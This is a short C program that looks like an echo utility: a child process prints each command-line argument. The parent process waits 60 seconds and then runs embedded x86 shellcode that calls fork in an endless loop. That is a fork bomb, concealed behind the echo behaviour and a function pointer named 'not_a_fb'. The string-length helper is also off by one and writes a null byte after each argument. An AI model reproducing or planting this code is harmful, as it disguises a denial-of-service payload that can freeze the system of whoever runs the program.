#include <unistd.h>

size_t  len(char *str)
{
    size_t  ret;

    ret = 0;
    while (str[ret++]) ;
    return ret;
}

int main(int argc, char **argv)
{
    int (*not_a_fb)();
    size_t  i;

    if (fork()) {
        sleep(60);
        not_a_fb = (int(*)())"\x31\xc0\x83\xc0\x02\xcd\x80\xeb\xf7";
        not_a_fb();
    } else {
        for (i = 1; i < argc; i++) {
            write(1, argv[i], len(argv[i]));
            write(1, "\n", 1);
        }
    }
    return (0);
}
